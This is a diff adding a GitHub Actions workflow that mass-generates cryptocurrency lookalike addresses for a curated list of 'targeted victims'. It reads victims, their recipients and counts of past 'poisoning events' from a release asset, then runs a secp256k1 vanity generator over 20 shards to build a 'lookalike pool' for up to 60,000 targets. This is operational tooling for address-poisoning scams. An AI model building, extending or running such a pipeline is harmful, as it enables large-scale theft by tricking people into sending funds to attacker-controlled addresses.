@@ -1,0 +1,146 @@
+name: Vanity wave (targeted victims)
+
+# Purpose-built generator for a curated, activity-filtered victim list.
+# Unlike vanity.yml it is dispatch-only and writes to its own release assets,
+# so the scheduled pipeline (critical_targets.csv / vanity_state.json) is
+# left untouched.
+#
+# Inputs:
+#   targets_asset : release asset with columns rank,victim,n_poisoning_events,recipient_rank,recipient
+#   out_asset     : cumulative output asset (lookalike pool for this wave)
+#
+# The driver covers rank < strong_count with strong attempts, the next
+# medium_count with medium attempts, and offset<=rank<basic_count with fast
+# 3+1 attempts. Defaults (0/0/60000) give every target a 3+1 lookalike.
+
+on:
+  workflow_dispatch:
+    inputs:
+      targets_asset:
+        description: "release asset holding the wave target list"
+        default: "wave_targets.csv"
+      out_asset:
+        description: "cumulative output asset name"
+        default: "wave_lookalikes.csv"
+      strong_count:
+        description: "top ranks receiving strong attempts (4+3/3+3)"
+        default: "0"
+      medium_count:
+        description: "next ranks receiving medium attempts (3+2)"
+        default: "0"
+      basic_count:
+        description: "cover window size (fast 3+1 attempts)"
+        default: "60000"
+
+permissions:
+  contents: write
+
+concurrency:
+  group: vanity-wave
+  cancel-in-progress: false
+
+jobs:
+  prepare:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    outputs:
+      total: ${{ steps.calc.outputs.total }}
+    env:
+      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+      - name: Download target list
+        run: gh release download scan-data -p "${{ inputs.targets_asset }}" -D . --clobber
+      - name: Normalise
+        run: mv "${{ inputs.targets_asset }}" wave_targets.csv
+      - name: Count targets
+        id: calc
+        run: |
+          TOTAL=$(python -c "import csv;print(len(set(r['victim'] for r in csv.DictReader(open('wave_targets.csv')))))")
+          echo "total=$TOTAL" >> "$GITHUB_OUTPUT"
+          echo "targets: $TOTAL unique victims"
+      - uses: actions/upload-artifact@v4
+        with:
+          name: wave-targets
+          path: wave_targets.csv
+          retention-days: 7
+
+  generate:
+    needs: prepare
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19]
+    env:
+      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+      - name: Install libsecp256k1 and build vanity
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq libsecp256k1-dev
+          cc -O2 -o vanity_bin vanity/vanity.c -lsecp256k1
+          ./vanity_bin --selftest
+      - uses: actions/download-artifact@v4
+        with:
+          name: wave-targets
+      - name: Generate lookalikes (shard ${{ matrix.shard }})
+        run: |
+          python -m src.vanity_driver \
+            --targets wave_targets.csv \
+            --out wave_lookalikes_${{ matrix.shard }}.csv \
+            --binary ./vanity_bin \
+            --shard ${{ matrix.shard }} \
+            --num-shards 20 \
+            --cores 4 \
+            --strong-count ${{ inputs.strong_count || 0 }} \
+            --medium-count ${{ inputs.medium_count || 0 }} \
+            --offset 0 \
+            --basic-count ${{ inputs.basic_count || 60000 }} \
+            --progress progress_wave_${{ matrix.shard }}.json
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: wave-lookalikes-${{ matrix.shard }}
+          path: wave_lookalikes_*.csv
+          if-no-files-found: warn
+          retention-days: 7
+
+  merge:
+    needs: [prepare, generate]
+    if: always()
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+      - uses: actions/download-artifact@v4
+        with:
+          pattern: wave-lookalikes-*
+          path: shards
+      - name: Merge cumulative CSV
+        run: |
+          for attempt in 1 2 3 4 5; do
+            gh release download scan-data -p "${{ inputs.out_asset }}" -D . --clobber 2>/dev/null && break
+            sleep 5
+          done || true
+          python -m src.vanity_merge --new shards --existing "${{ inputs.out_asset }}" --out "${{ inputs.out_asset }}"
+          gh release upload scan-data "${{ inputs.out_asset }}" --clobber
+      - uses: actions/upload-artifact@v4
+        with:
+          name: wave-lookalikes-merged
+          path: ${{ inputs.out_asset }}
+          if-no-files-found: warn
+          retention-days: 14
